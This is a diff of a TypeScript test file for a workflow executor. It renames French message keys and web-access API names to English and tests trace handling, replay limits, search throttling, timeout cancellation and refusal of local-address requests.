+        { id: "b", type: "code", status: "resumed", start: null, end: null, items: 2, log: [] },
+        { id: "c", type: "code", status: "succeeded", start: T, end: T, items: 2, output: [10, 20], log: [] },
+        { id: "sortie", type: "output", status: "succeeded", start: T, end: T, items: 2, output: [10, 20], log: [] },
       ]);
     });
 
     it("a trial: the status counts only the relaunched blocks, and lines forged for a reused or non-relaunched block are rejected", async () => {
       const b = await bench(chain("a", "b", "c"), {}, {
         launch: scriptedLauncher([
-          { t: "bloc", id: "b", step: "debut" },
-          { t: "journal", block: "b", text: "forgé" },
-          { t: "bloc", id: "b", step: "fin", status: "reussi", output: "forgée" },
-          { t: "journal", block: "a", text: "forgé" },
-          { t: "bloc", id: "c", step: "debut" },
-          { t: "bloc", id: "c", step: "fin", status: "reussi", output: [1] },
-          { t: "bloc", id: "a", step: "debut" },
-          { t: "bloc", id: "sortie", step: "debut" },
-          { t: "bloc", id: "sortie", step: "fin", status: "reussi", output: [1] },
-          { t: "fin", data: [1] },
+          { t: "block", id: "b", step: "start" },
+          { t: "log", block: "b", text: "forgé" },
+          { t: "block", id: "b", step: "end", status: "succeeded", output: "forgée" },
+          { t: "log", block: "a", text: "forgé" },
+          { t: "block", id: "c", step: "start" },
+          { t: "block", id: "c", step: "end", status: "succeeded", output: [1] },
+          { t: "block", id: "a", step: "start" },
+          { t: "block", id: "sortie", step: "start" },
+          { t: "block", id: "sortie", step: "end", status: "succeeded", output: [1] },
+          { t: "end", data: [1] },
         ]),
       });
       b.ctx.replay = replayFromC;
@@ -644,18 +644,18 @@ describe("executerWorkflow", () => {
       b.infra.onTrace = (t) => relayed.push(t);
       const r = await runWorkflow(b.ctx, b.infra);
       expect(r.run.status).toBe("reussie");
-      expect(r.run.blocks.map((x) => [x.id, x.status])).toEqual([["a", "pas-lance"], ["b", "repris"], ["c", "reussi"], ["sortie", "reussi"]]);
+      expect(r.run.blocks.map((x) => [x.id, x.status])).toEqual([["a", "not-run"], ["b", "resumed"], ["c", "succeeded"], ["sortie", "succeeded"]]);
       expect(r.run.blocks[0]!.log).toEqual([]);
       expect(r.run.blocks[1]).toMatchObject({ items: 2, log: [], start: null });
       expect(r.run.blocks[1]!.output).toBeUndefined();
-      expect(relayed.map((t: any) => `${t.etape}:${t.bloc}`)).toEqual(["debut:c", "fin:c", "debut:sortie", "fin:sortie"]);
+      expect(relayed.map((t: any) => `${t.step}:${t.block}`)).toEqual(["start:c", "end:c", "start:sortie", "end:sortie"]);
     });
 
     it("a trial sends no memory and returns none", async () => {
       const received: string[] = [];
       const b = await bench(chain("a", "b", "c"), {}, {
         launch: () => {
-          const p = scriptedLauncher([{ t: "memoire", memory: { c: { type: "code", value: "forgée" } } }, { t: "fin", data: null }])("", []);
+          const p = scriptedLauncher([{ t: "memory", memory: { c: { type: "code", value: "forgée" } } }, { t: "end", data: null }])("", []);
           p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
           return p;
         },
@@ -664,16 +664,16 @@ describe("executerWorkflow", () => {
       b.ctx.replay = replayFromC;
       const r = await runWorkflow(b.ctx, b.infra);
       const lignes = received.join("").trim().split("\n").map((l) => JSON.parse(l));
-      expect(lignes[0].rejeu).toEqual({ reruns: ["c", "sortie"], outputs: { b: [{ x: 1 }, { x: 2 }] } });
-      expect(lignes[1]).toEqual({ t: "memoire", memory: {} });
-      expect(r.issue).toMatchObject({ t: "fin", memory: null });
+      expect(lignes[0].replay).toEqual({ reruns: ["c", "sortie"], outputs: { b: [{ x: 1 }, { x: 2 }] } });
+      expect(lignes[1]).toEqual({ t: "memory", memory: {} });
+      expect(r.issue).toMatchObject({ t: "end", memory: null });
     });
 
     it("outputs to reuse of over 4 MB stop the trial without launching a container", async () => {
       const b = await bench(chain("a", "b", "c"));
       b.ctx.replay = { ...replayFromC, outputs: { b: "x".repeat(LINE_MAX_BYTES) } };
       const r = await runWorkflow(b.ctx, b.infra);
-      expect(r.issue).toEqual({ t: "arret", status: "erreur", error: REPLAY_TOO_BIG });
+      expect(r.issue).toEqual({ t: "stop", status: "erreur", error: REPLAY_TOO_BIG });
       expect(REPLAY_TOO_BIG).toBe("Rejeu impossible : les sorties à reprendre dépassent 4 Mo");
       expect(b.commands).toEqual([]);
       expect(r.run).toMatchObject({ status: "echouee", error: REPLAY_TOO_BIG, kernelError: true });
@@ -684,21 +684,21 @@ describe("executerWorkflow", () => {
     const b = await bench(chain("a"), {
       "a.mjs": `export default async () => {
         const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
-        l({ t: "bloc", id: "sortie", etape: "debut" });
-        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
-        l({ t: "bloc", id: "inconnu", etape: "debut" });
+        l({ t: "block", id: "sortie", step: "start" });
+        l({ t: "block", id: "sortie", step: "end", status: "succeeded", output: "forgée" });
+        l({ t: "block", id: "inconnu", step: "start" });
         return [1, 2, 3];
       };`,
     });
     const relayed: unknown[] = [];
     b.infra.onTrace = (t) => relayed.push(t);
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: [1, 2, 3] } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: [1, 2, 3] } });
     expect(relayed).toEqual([
-      { block: "a", step: "debut" },
-      { block: "a", step: "fin", status: "reussi", items: 3 },
-      { block: "sortie", step: "debut" },
-      { block: "sortie", step: "fin", status: "reussi", items: 3 },
+      { block: "a", step: "start" },
+      { block: "a", step: "end", status: "succeeded", items: 3 },
+      { block: "sortie", step: "start" },
+      { block: "sortie", step: "end", status: "succeeded", items: 3 },
     ]);
   });
 
@@ -708,7 +708,7 @@ describe("executerWorkflow", () => {
       throw new Error("relais cassé");
     };
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: 1 } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: 1 } });
     expect(r.run.status).toBe("reussie");
   });
 
@@ -716,9 +716,9 @@ describe("executerWorkflow", () => {
     const b = await bench(chain("a"));
     b.infra.workshop = { harvestCommand: () => { throw new Error("Docker introuvable"); }, deleteHarvest: async () => {} };
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "arret", status: "erreur", error: "Récolte impossible à lancer : Docker introuvable" });
+    expect(r.issue).toEqual({ t: "stop", status: "erreur", error: "Récolte impossible à lancer : Docker introuvable" });
     expect(r.run.status).toBe("echouee");
-    expect(r.run.blocks.every((x) => x.status === "pas-lance")).toBe(true);
+    expect(r.run.blocks.every((x) => x.status === "not-run")).toBe(true);
   });
 });
 
@@ -754,13 +754,13 @@ describe("executerWorkflow: web search and open reads", () => {
     b.infra.searchUrl = BASE;
     return { b, bridge: bridge, html: () => bridge.calls.filter((a) => a.method === "lireHtmlInvisible") };
   }
-  const value = (r: Awaited<ReturnType<typeof runWorkflow>>) => (r.issue.t === "fin" ? r.issue.output.value : r.issue);
+  const value = (r: Awaited<ReturnType<typeof runWorkflow>>) => (r.issue.t === "end" ? r.issue.output.value : r.issue);
   /** Code that makes these calls one after the other and returns, for each, the result or « erreur: <message> ». */
   const afterwards = (calls: string[]) => `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
     export default async (e, w) => { const r = []; ${calls.map((a) => `r.push(await essai(${a}));`).join(" ")} return r; };`;
 
   it("chercherWeb returns the results of the recorded page, search url built on urlRecherche", async () => {
-    const { b, html } = await webBench(afterwards([`w.chercherWeb("clio fiabilité", { nombre: 3 })`]), {
+    const { b, html } = await webBench(afterwards([`w.searchWeb("clio fiabilité", { count: 3 })`]), {
       web: true,
       html: { [searchUrl("clio fiabilité", BASE)]: page("resultats.html") },
     });
@@ -781,13 +781,13 @@ describe("executerWorkflow: web search and open reads", () => {
       "https://b.example/",
       "https://c.example/",
     ].map(block).join("");
-    const { b } = await webBench(afterwards([`w.chercherWeb("x", { nombre: 2 })`]), { web: true, html: { [searchUrl("x", BASE)]: local } });
+    const { b } = await webBench(afterwards([`w.searchWeb("x", { count: 2 })`]), { web: true, html: { [searchUrl("x", BASE)]: local } });
     const r = await runWorkflow(b.ctx, b.infra);
     expect(value(r)).toEqual([[{ title: "T", url: "https://a.example/", excerpt: "E" }, { title: "T", url: "https://b.example/", excerpt: "E" }]]);
   });
 
   it("without web: WEB_REQUIRED, no call to the bridge", async () => {
-    const { b, bridge: bridge } = await webBench(afterwards([`w.chercherWeb("x")`]), { html: { [searchUrl("x", BASE)]: page("resultats.html") } });
+    const { b, bridge: bridge } = await webBench(afterwards([`w.searchWeb("x")`]), { html: { [searchUrl("x", BASE)]: page("resultats.html") } });
     const r = await runWorkflow(b.ctx, b.infra);
     expect(value(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
     expect(bridge.calls).toEqual([]);
@@ -795,7 +795,7 @@ describe("executerWorkflow: web search and open reads", () => {
 
   it("widget with an account: WEB_REQUIRED", async () => {
     // web with an account is refused at the widget.json read; the executor refuses anyway.
-    const { b, html } = await webBench(afterwards([`w.chercherWeb("x")`]), {
+    const { b, html } = await webBench(afterwards([`w.searchWeb("x")`]), {
       web: true,
       account: ["mail.google.com"],
       html: { [searchUrl("x", BASE)]: page("resultats.html") },
@@ -807,7 +807,7 @@ describe("executerWorkflow: web search and open reads", () => {
 
   it("31e recherche : SEARCHES_CAP, 30 lectures de HTML seulement", async () => {
     const { pacing: pacing, waits: waits } = fakePacing();
-    const { b, html } = await webBench(afterwards(Array.from({ length: 31 }, () => `w.chercherWeb("clio", { nombre: 1 })`)), {
+    const { b, html } = await webBench(afterwards(Array.from({ length: 31 }, () => `w.searchWeb("clio", { count: 1 })`)), {
       web: true,
       pacing: pacing,
       html: { [searchUrl("clio", BASE)]: page("resultats.html") },
@@ -822,7 +822,7 @@ describe("executerWorkflow: web search and open reads", () => {
   });
 
   it("check page: SEARCH_DENIED, then SEARCHES_STOPPED without a new read", async () => {
-    const { b, html } = await webBench(afterwards([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
+    const { b, html } = await webBench(afterwards([`w.searchWeb("a")`, `w.searchWeb("b")`]), {
       web: true,
       html: { [searchUrl("a", BASE)]: page("verification.html"), [searchUrl("b", BASE)]: page("resultats.html") },
     });
@@ -835,7 +835,7 @@ describe("executerWorkflow: web search and open reads", () => {
     const { pacing: pacing, waits: waits } = fakePacing();
     const { b, html } = await webBench(
       `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
-      export default async (e, w) => Promise.all([essai(w.chercherWeb("a")), essai(w.chercherWeb("b"))]);`,
+      export default async (e, w) => Promise.all([essai(w.searchWeb("a")), essai(w.searchWeb("b"))]);`,
       { web: true, pacing: pacing, html: { [searchUrl("a", BASE)]: page("verification.html"), [searchUrl("b", BASE)]: page("resultats.html") } },
     );
     const r = await runWorkflow(b.ctx, b.infra);
@@ -847,7 +847,7 @@ describe("executerWorkflow: web search and open reads", () => {
   });
 
   it("page changed: UNREADABLE_RESULTS, never an empty list; no result: empty list", async () => {
-    const { b } = await webBench(afterwards([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
+    const { b } = await webBench(afterwards([`w.searchWeb("a")`, `w.searchWeb("b")`]), {
       web: true,
       html: { [searchUrl("a", BASE)]: page("changee.html"), [searchUrl("b", BASE)]: page("aucun-resultat.html") },
     });
@@ -863,11 +863,11 @@ describe("executerWorkflow: web search and open reads", () => {
       `const essai = (p) => p.then(() => "ok", (e) => "erreur: " + e.message);
       export default async (e, w) => {
         const r = [];
-        for (let i = 0; i < 40; i++) r.push(await essai(w.lirePage("https://www.pages.example/" + i)));
-        for (let i = 0; i < 30; i++) r.push(await essai(w.recuperer("${web.url}/f")));
-        for (let i = 0; i < 30; i++) r.push(await essai(w.lireFlux("${web.url}/f")));
-        r.push(await essai(w.lirePage("https://pages.example/de-trop")));
-        r.push(await essai(w.recuperer("${web.url}/f")));
+        for (let i = 0; i < 40; i++) r.push(await essai(w.readPage("https://www.pages.example/" + i)));
+        for (let i = 0; i < 30; i++) r.push(await essai(w.fetch("${web.url}/f")));
+        for (let i = 0; i < 30; i++) r.push(await essai(w.readFeed("${web.url}/f")));
+        r.push(await essai(w.readPage("https://pages.example/de-trop")));
+        r.push(await essai(w.fetch("${web.url}/f")));
         return r;
       };`,
       { web: true, pacing: pacing },
@@ -900,9 +900,9 @@ describe("executerWorkflow: web search and open reads", () => {
       chain("a"),
       {
         "a.mjs": `export default async (e, w) => [
-          (await w.lirePage("https://b.example/1")).url,
-          (await w.lirePage("https://a.example/court")).url,
-          (await w.lirePage("https://a.example/meme")).url,
+          (await w.readPage("https://b.example/1")).url,
+          (await w.readPage("https://a.example/court")).url,
+          (await w.readPage("https://a.example/meme")).url,
         ];`,
       },
       { bridge: bridge },
@@ -931,7 +931,7 @@ describe("executerWorkflow: web search and open reads", () => {
     const { pacing: pacing, waits: waits } = fakePacing();
     const read = vi.spyOn(pacing, "read");
     const { b } = await webBench(
-      `export default async (e, w) => [await w.recuperer("${elsewhere}"), await w.recuperer("${web.url}/vers-localhost")];`,
+      `export default async (e, w) => [await w.fetch("${elsewhere}"), await w.fetch("${web.url}/vers-localhost")];`,
       { web: true, pacing: pacing },
     );
     const r = await runWorkflow(b.ctx, b.infra);
@@ -953,7 +953,7 @@ describe("executerWorkflow: web search and open reads", () => {
     target = `http://localhost:${web.port}/f`;
     const stop = new AbortController();
     const changeHost = vi.fn(() => new Promise<void>(() => {}));
-    const p = fetch(`${web.url}/vers-localhost`, "texte", null, true, stop.signal, changeHost);
+    const p = fetch(`${web.url}/vers-localhost`, "text", null, true, stop.signal, changeHost);
     p.catch(() => {});
     await vi.waitFor(() => expect(changeHost).toHaveBeenCalledWith("localhost"));
     stop.abort(new Error("Exécution arrêtée"));
@@ -967,7 +967,7 @@ describe("executerWorkflow: web search and open reads", () => {
     const resolution = vi.spyOn(dns, "lookup").mockImplementation(((_h: string, _o: unknown, callback: (e: null, a: dns.LookupAddress[]) => void) =>
       callback(null, [{ address: "127.0.0.1", family: 4 }])) as unknown as typeof dns.lookup);
     try {
-      await expect(fetch(`http://piege.example:${web.port}/`, "texte", null, false)).rejects.toThrow("Adresse locale refusée");
+      await expect(fetch(`http://piege.example:${web.port}/`, "text", null, false)).rejects.toThrow("Adresse locale refusée");
     } finally {
       resolution.mockRestore();
     }
@@ -979,7 +979,7 @@ describe("executerWorkflow: web search and open reads", () => {
     const read = vi.spyOn(spy, "read");
     const search = vi.spyOn(spy, "search");
     const { b, bridge: bridge } = await webBench(
-      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.lirePage("https://pages.example/" + i); return "fini"; };`,
+      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.readPage("https://pages.example/" + i); return "fini"; };`,
       { pacing: spy },
     );
     const r = await runWorkflow(b.ctx, b.infra);
@@ -994,11 +994,11 @@ describe("executerWorkflow: web search and open reads", () => {
     const pending: (() => void)[] = [];
     const pacing = new Pacing({ now: () => t, wait: () => new Promise<void>((ok) => pending.push(ok)) });
     const { b, bridge: bridge } = await webBench(
-      `export default async (e, w) => { await w.lirePage("https://pages.example/1"); return w.lirePage("https://pages.example/2"); };`,
+      `export default async (e, w) => { await w.readPage("https://pages.example/1"); return w.readPage("https://pages.example/2"); };`,
       { web: true, pacing: pacing, delayMs: 300 },
     );
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "arret", status: "erreur", error: "Délai dépassé" });
+    expect(r.issue).toEqual({ t: "stop", status: "erreur", error: "Délai dépassé" });
     // The gap elapses after the stop: the queued read does not leave.
     t += 10_000;
     for (const ok of pending.splice(0)) ok();
@@ -1011,7 +1011,7 @@ describe("executerWorkflow: web search and open reads", () => {
     const pending: (() => void)[] = [];
     const pacing = new Pacing({ now: () => t, wait: () => new Promise<void>((ok) => pending.push(ok)) });
     const { b, html } = await webBench(
-      `export default async (e, w) => { await w.chercherWeb("a"); w.chercherWeb("b").catch(() => {}); return "fini"; };`,
+      `export default async (e, w) => { await w.searchWeb("a"); w.searchWeb("b").catch(() => {}); return "fini"; };`,
       { web: true, pacing: pacing, html: { [searchUrl("a", BASE)]: page("resultats.html") } },
     );
     const r = await runWorkflow(b.ctx, b.infra);
@@ -1041,31 +1041,31 @@ describe("executerWorkflow: a stop cancels the reads in progress", () => {
         stderr.end();
         finish(null);
       };
-      setImmediate(() => calls.forEach((x, i) => stdout.write(JSON.stringify({ t: "appel", n: i + 1, ...x }) + "\n")));
+      setImmediate(() => calls.forEach((x, i) => stdout.write(JSON.stringify({ t: "call", n: i + 1, ...x }) + "\n")));
       return { stdin, stdout, stderr, kill: () => kill(), end: end };
     };
     return {
       launch: launch,
       /** The container is removed from outside (quitting the browser). */
       kill: () => kill(),
-      responses: () => received.join("").split("\n").filter((l) => l.includes(`"t":"reponse"`)),
+      responses: () => received.join("").split("\n").filter((l) => l.includes(`"t":"answer"`)),
     };
   };
   const cancelledList = (bridge: FakeBridge) => bridge.calls.filter((a) => a.method === "lectureAnnulee").map((a) => a.args[0]);
-  const value = (r: Awaited<ReturnType<typeof runWorkflow>>) => (r.issue.t === "fin" ? r.issue.output.value : r.issue);
+  const value = (r: Awaited<ReturnType<typeof runWorkflow>>) => (r.issue.t === "end" ? r.issue.output.value : r.issue);
 
   it("timeout exceeded: pages (public, with an account) and fetch in progress cancelled, nothing comes back to the container", async () => {
     const closed: string[] = [];
     const web = await webServer({ "/lent": (res) => void res.on("close", () => closed.push("/lent")) });
     const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [], suspended: ["https://pages.example/a", "https://app.daily.dev/b"] } });
     const c = callsContainer([
-      { f: "lirePage", a: { url: "https://pages.example/a" } },
-      { f: "lirePage", a: { url: "https://app.daily.dev/b", account: true } },
-      { f: "recuperer", a: { url: `${web.url}/lent` } },
+      { f: "readPage", a: { url: "https://pages.example/a" } },
+      { f: "readPage", a: { url: "https://app.daily.dev/b", account: true } },
+      { f: "fetch", a: { url: `${web.url}/lent` } },
     ]);
     const b = await bench(chain("a"), {}, { bridge: bridge, account: ["app.daily.dev"], public: ["pages.example", "127.0.0.1"], grant: { profile: "perso" }, delayMs: 300, launch: c.launch });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "arret", status: "erreur", error: "Délai dépassé" });
+    expect(r.issue).toEqual({ t: "stop", status: "erreur", error: "Délai dépassé" });
     await vi.waitFor(() => {
       expect(cancelledList(bridge).sort()).toEqual(["https://app.daily.dev/b", "https://pages.example/a"]);
       expect(closed).toEqual(["/lent"]);
@@ -1080,14 +1080,14 @@ describe("executerWorkflow: a stop cancels the reads in progress", () => {
       allow: false,
       read: { pages: [{ url: "https://pages.example/b", title: "B", text: "", links: [] }], suspended: ["https://pages.example/a", "https://pages.example/b"] },
     });
-    const other = await bench(chain("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://pages.example/b")).titre;` }, { bridge: bridge });
-    const c = callsContainer([{ f: "lirePage", a: { url: "https://pages.example/a" } }]);
+    const other = await bench(chain("a"), { "a.mjs": `export default async (e, w) => (await w.readPage("https://pages.example/b")).title;` }, { bridge: bridge });
+    const c = callsContainer([{ f: "readPage", a: { url: "https://pages.example/a" } }]);
     const b = await bench(chain("a"), {}, { bridge: bridge, launch: c.launch });
     const rOther = runWorkflow(other.ctx, other.infra);
     const r = runWorkflow(b.ctx, b.infra);
     await vi.waitFor(() => expect(bridge.calls.filter((a) => a.method === "lirePageInvisible")).toHaveLength(2));
     c.kill();
-    expect((await r).issue.t).toBe("echec");
+    expect((await r).issue.t).toBe("failure");
     await vi.waitFor(() => expect(cancelledList(bridge)).toEqual(["https://pages.example/a"]));
     // The other run, for its part, still reads.
     expect(bridge.release("https://pages.example/b")).toBe(1);
@@ -1120,17 +1120,17 @@ describe("executerWorkflow: a stop cancels the reads in progress", () => {
       bb.infra.searchUrl = BASE;
     };
     const c = callsContainer([
-      { f: "lirePage", a: { url: "https://pages.example/1" } },
-      { f: "chercherWeb", a: { query: "a", count: 1 } },
+      { f: "readPage", a: { url: "https://pages.example/1" } },
+      { f: "searchWeb", a: { query: "a", count: 1 } },
     ]);
     const b = await bench(chain("a"), {}, { bridge: bridge, delayMs: 300, launch: c.launch });
     prepare(b);
-    expect((await runWorkflow(b.ctx, b.infra)).issue).toEqual({ t: "arret", status: "erreur", error: "Délai dépassé" });
+    expect((await runWorkflow(b.ctx, b.infra)).issue).toEqual({ t: "stop", status: "erreur", error: "Délai dépassé" });
     await vi.waitFor(() => expect(cancelledList(bridge).sort()).toEqual(["https://pages.example/1", searchUrl("a", BASE)].sort()));
     // Another run on the same throttle: neither the host's lane nor the searches' lane stays taken.
     const next = await bench(
       chain("a"),
-      { "a.mjs": `export default async (e, w) => [(await w.lirePage("https://pages.example/2")).titre, (await w.chercherWeb("b", { nombre: 1 })).length];` },
+      { "a.mjs": `export default async (e, w) => [(await w.readPage("https://pages.example/2")).title, (await w.searchWeb("b", { count: 1 })).length];` },
       { bridge: bridge, delayMs: 3000 },
     );
     prepare(next);
@@ -1147,9 +1147,9 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
     version: 1,
     blocks: [
       { id: "liste", type: "code", params: { source: "liste.mjs" } },
-      { id: "fiche", type: "source.recuperer", params: { url: "{url}", perItem: true } },
-      { id: "avis", type: "source.recuperer", params: { url: "{url}", perItem: true } },
-      { id: "sortie", type: "sortie", params: { to: "widget", ...(o.live ? { live: true } : {}) } },
+      { id: "fiche", type: "source.fetch", params: { url: "{url}", perItem: true } },
+      { id: "avis", type: "source.fetch", params: { url: "{url}", perItem: true } },
+      { id: "sortie", type: "output", params: { to: "widget", ...(o.live ? { live: true } : {}) } },
     ],
     links: [{ from: "liste", to: "fiche" }, { from: "fiche", to: "avis" }, { from: "avis", to: "sortie" }],
   });
@@ -1221,8 +1221,8 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
     }
   }
 
-  const blockStart = (id: string) => ({ t: "bloc", id, step: "debut" });
-  const blockEnd = (id: string, output: unknown = [{ url: "https://a.example/1" }], status = "reussi") => ({ t: "bloc", id, step: "fin", status: status, output: output });
+  const blockStart = (id: string) => ({ t: "block", id, step: "start" });
+  const blockEnd = (id: string, output: unknown = [{ url: "https://a.example/1" }], status = "succeeded") => ({ t: "block", id, step: "end", status: status, output: output });
   const pub = (data: unknown, done: number, total: number) => ({ t: "publication", data: data, done: done, total });
   const attempt = (b: Bench) => {
     b.ctx.trigger = "rejeu";
@@ -1235,24 +1235,24 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
 
   it("widget without the new fields: debut line identical to today, timeout 180, delay 200 s", async () => {
     const received: string[] = [];
-    const b = await bench(watch(), {}, { launch: launcherSteps([{ t: "fin", data: null }], { received: received }) });
+    const b = await bench(watch(), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: received }) });
     const timeout = connectWorkshop(b);
     const delays = await delaysDuring(() => runWorkflow(b.ctx, b.infra));
     const { workflow, order: order } = b.ctx.valid;
     expect(received.join("").split("\n")[0]).toBe(
-      JSON.stringify({ t: "debut", previous: null, now: NOW.toISOString(), config: { interests: "rust" }, workflow: { blocks: workflow.blocks, links: workflow.links, order: order } }),
+      JSON.stringify({ t: "start", previous: null, now: NOW.toISOString(), config: { interests: "rust" }, workflow: { blocks: workflow.blocks, links: workflow.links, order: order } }),
     );
     expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
     expect(delays).toContain(200_000);
   });
 
-  it("Gmail widget (account, recolte.mjs alone): identical debut line, timeout 180, delay 200 s, neither surMemoire nor memoire on an echec", async () => {
+  it("Gmail widget (account, harvest.mjs alone): identical debut line, timeout 180, delay 200 s, neither surMemoire nor memoire on an echec", async () => {
     const received: string[] = [];
-    const implicit = { version: 1, blocks: [{ id: "recolte", type: "code", params: { source: "recolte.mjs" } }, { id: "sortie", type: "sortie", params: { to: "widget" } }], links: [{ from: "recolte", to: "sortie" }] };
+    const implicit = { version: 1, blocks: [{ id: "recolte", type: "code", params: { source: "harvest.mjs" } }, { id: "sortie", type: "output", params: { to: "widget" } }], links: [{ from: "recolte", to: "sortie" }] };
     const b = await bench(implicit, {}, {
       account: ["mail.google.com"],
       grant: { profile: "p1" },
-      launch: launcherSteps([{ t: "memoire", memory: { harvest: { type: "code", value: 1 } } }, { t: "journal", block: "recolte", text: "x" }, { t: "echec", error: "cassé" }], { received: received }),
+      launch: launcherSteps([{ t: "memory", memory: { harvest: { type: "code", value: 1 } } }, { t: "log", block: "recolte", text: "x" }, { t: "failure", error: "cassé" }], { received: received }),
     });
     const timeout = connectWorkshop(b);
     const memories: unknown[] = [];
@@ -1263,22 +1263,22 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
     });
     const { workflow, order: order } = b.ctx.valid;
     expect(received.join("").split("\n")[0]).toBe(
-      JSON.stringify({ t: "debut", previous: null, now: NOW.toISOString(), config: { interests: "rust" }, workflow: { blocks: workflow.blocks, links: workflow.links, order: order } }),
+      JSON.stringify({ t: "start", previous: null, now: NOW.toISOString(), config: { interests: "rust" }, workflow: { blocks: workflow.blocks, links: workflow.links, order: order } }),
     );
     expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
     expect(delays).toContain(200_000);
     expect(memories).toEqual([]);
-    expect(outcome).toEqual({ t: "echec", error: "cassé", codeError: true });
+    expect(outcome).toEqual({ t: "failure", error: "cassé", codeError: true });
   });
 
   it("dureeMaxMinutes 30: debut carries limiteMs 1,800,000 and progressif, container launched with timeout 1830, delay 1,850 s", async () => {
     const received: string[] = [];
-    const b = await bench(watch(), {}, { launch: launcherSteps([{ t: "fin", data: null }], { received: received }) });
+    const b = await bench(watch(), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: received }) });
     b.ctx.maxDurationMinutes = 30;
     const timeout = connectWorkshop(b);
     const delays = await delaysDuring(() => runWorkflow(b.ctx, b.infra));
     const start = JSON.parse(received.join("").split("\n")[0]!);
-    expect(start).toMatchObject({ t: "debut", limitMs: 1_800_000, progressive: true });
+    expect(start).toMatchObject({ t: "start", limitMs: 1_800_000, progressive: true });
     expect(timeout()).toEqual(["timeout", "-k", "5", "1830"]);
     expect(delays).toContain(1_850_000);
     expect(delays).not.toContain(200_000);
@@ -1286,20 +1286,20 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
 
   it("auFilDeLEau without dureeMaxMinutes: progressif without limiteMs; a trial is never progressive", async () => {
     const received: string[] = [];
-    const b = await bench(watch({ live: true }), {}, { launch: launcherSteps([{ t: "fin", data: null }], { received: received }) });
+    const b = await bench(watch({ live: true }), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: received }) });
     await runWorkflow(b.ctx, b.infra);
     const start = JSON.parse(received.join("").split("\n")[0]!);
-    expect(start.progressif).toBe(true);
+    expect(start.progressive).toBe(true);
     expect("limitMs" in start).toBe(false);
 
     const receivedAttempt: string[] = [];
-    const e = await bench(watch({ live: true }), {}, { launch: launcherSteps([{ t: "fin", data: null }], { received: receivedAttempt }) });
+    const e = await bench(watch({ live: true }), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: receivedAttempt }) });
     e.ctx.maxDurationMinutes = 30;
     attempt(e);
     await runWorkflow(e.ctx, e.infra);
     const attemptStart = JSON.parse(receivedAttempt.join("").split("\n")[0]!);
     expect("progressive" in attemptStart).toBe(false);
-    expect(attemptStart.limiteMs).toBe(1_800_000);
+    expect(attemptStart.limitMs).toBe(1_800_000);
   });
 
   it("chain traces accepted; an out-of-order chain end rejected", async () => {
@@ -1307,10 +1307,10 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
       launch: launcherSteps([
         blockStart("liste"), blockEnd("liste"),
         blockStart("fiche"), blockStart("avis"),
-        { t: "journal", block: "fiche", text: "lu" },
+        { t: "log", block: "fiche", text: "lu" },
         blockEnd("fiche"), blockEnd("avis"),
         blockStart("sortie"), blockEnd("sortie"),
-        { t: "fin", data: [] },
+        { t: "end", data: [] },
       ]),
     });
     const relayed: unknown[] = [];
@@ -1319,14 +1319,14 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
     expect(r.run.status).toBe("reussie");
     expect(r.run.blocks.find((x) => x.id === "fiche")!.log).toEqual(["lu"]);
     expect(relayed).toEqual([
-      { block: "liste", step: "debut" },
-      { block: "liste", step: "fin", status: "reussi", items: 1 },
-      { block: "fiche", step: "debut" },
-      { block: "avis", step: "debut" },
-      { block: "fiche", step: "fin", status: "reussi", items: 1 },
-      { block: "avis", step: "fin", status: "reussi", items: 1 },
-      { block: "sortie", step: "debut" },
-      { block: "sortie", step: "fin", status: "reussi", items: 1 },
+      { block: "liste", step: "start" },
+      { block: "liste", step: "end", status: "succeeded", items: 1 },
+      { block: "fiche", step: "start" },
+      { block: "avis", step: "start" },
+      { block: "fiche", step: "end", status: "succeeded", items: 1 },
+      { block: "avis", step: "end", status: "succeeded", items: 1 },
+      { block: "sortie", step: "start" },
+      { block: "sortie", step: "end", status: "succeeded", items: 1 },
     ]);
 
     // End of avis before that of fiche: rejected; avis started without an end, the output (arriving too early) rejected.
@@ -1336,14 +1336,14 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         blockStart("fiche"), blockStart("avis"),
         blockEnd("avis"), blockEnd("fiche"),
         blockStart("sortie"),
-        { t: "fin", data: [] },
+        { t: "end", data: [] },
       ]),
     });
     const relayees2: unknown[] = [];
     unordered.infra.onTrace = (t) => relayees2.push(t);
     const r2 = await runWorkflow(unordered.ctx, unordered.infra);
-    expect(r2.run.blocks.map((x) => x.status)).toEqual(["reussi", "reussi", "echoue", "pas-lance"]);
-    expect(relayees2).not.toContainEqual(expect.objectContaining({ block: "avis", step: "fin" }));
